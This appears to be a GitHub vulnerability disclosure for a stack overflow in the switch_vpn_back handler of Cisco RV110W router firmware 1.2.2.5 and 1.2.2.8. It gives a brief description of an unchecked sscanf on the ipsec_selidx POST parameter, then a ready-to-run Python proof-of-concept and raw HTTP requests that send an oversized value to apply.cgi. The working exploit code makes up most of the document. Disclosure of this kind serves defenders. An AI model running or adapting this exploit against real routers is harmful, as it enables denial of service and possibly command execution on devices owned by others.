![image](https://github.com/BuaaIOTTeam/Iot_Cisco/assets/169221427/756738d5-bf18-49ee-a09d-1ccda95b9b9d)# Overview
Firmware download website: [https://software.cisco.com/download/home/283879340/type/282487380/release/1.2.2.5](https://software.cisco.com/download/home/283879340/type/282487380/release/1.2.2.5)
[https://software.cisco.com/download/home/283879340/type/282487380/release/1.2.2.8](https://software.cisco.com/download/home/283879340/type/282487380/release/1.2.2.8)

# Affected version
CISCO RV110W  Firmware 1.2.2.5,1.2.2.8
# Vulnerability details
The CISCO RV110W 1.2.2.5,1.2.2.8 firmware has a stack overflow vulnerability in switch_vpn_back function. The variable `ipsec_selidx` receives the ipsec_selidx parameter from a POST request. Since the user can control the input of ipsec_selidx, in the `switch_vpn_back`function, Using `sscanf` to parse POST parameters into variables v4 and v5 can lead to a stack overflow.triggering this security vulnerability, which can lead to command execution and denial of service.
![image](https://github.com/BuaaIOTTeam/Iot_Cisco/assets/169221427/94756ee0-ff63-4d1d-95b6-301f7a79b80f)

# POC
```c
import requests
url = 'http://192.168.2.2/apply.cgi;session_id=70354b4414ab4be5dcf3c4fa9d0cf2fe'
headers = {
    'Host': '192.168.2.2',
    'Cookie': 'password=fovmji; SESSION_ID=2:1713518685:2',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'iframe',
    'Referer': 'https://192.168.2.2/network_tools.asp;session_id=5b2e177465a1f96f080aad83f5fc8736',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-CN,zh;q=0.9',
    'Connection': 'close'
}

data = {
    'submit_button': 'status_ipsec',
    'change_action': 'gozila_cgi',
    'submit_type': 'switchback',
    'gui_action': '',
    'traceroute_ip': '',
    'commit': '0',
    'ping_times': '3',
    'ping_size': '64',
    'wait_time': '4',
    'ping_ip': '',
    'lookup_name': 'yahoo.com',
    'ipsec_selidx': 'a'*1000 + ':' + 'b'*1000
}

response = requests.post(url, headers=headers, data=data)
print(f"Status Code: {response.status_code}")
print("Response Text:")
print(response.text)

```
```c
GET /main.html HTTP/1.1
Host: 192.168.0.200
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Referer: http://192.168.0.200/login.html
Connection: close
Cookie: password=7da188c2e2d83e38b7d9e75e500f1af8ser5gk

POST /apply.cgi;session_id=70354b4414ab4be5dcf3c4fa9d0cf2fe HTTP/1.1
Host: 192.168.2.2
Cookie: password=fovmji; SESSION_ID=2:1713518685:2
Content-Length: 2882
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://192.168.2.2
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: iframe
Referer: https://192.168.2.2/network_tools.asp;session_id=5b2e177465a1f96f080aad83f5fc8736
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

submit_button=status_ipsec&change_action=gozila_cgi&submit_type=switchback&gui_action=&traceroute_ip=&commit=0&ping_times=3&ping_size=64&wait_time=4&ping_ip=&lookup_name=yahoo.com&ipsec_selidx=11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111:1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
```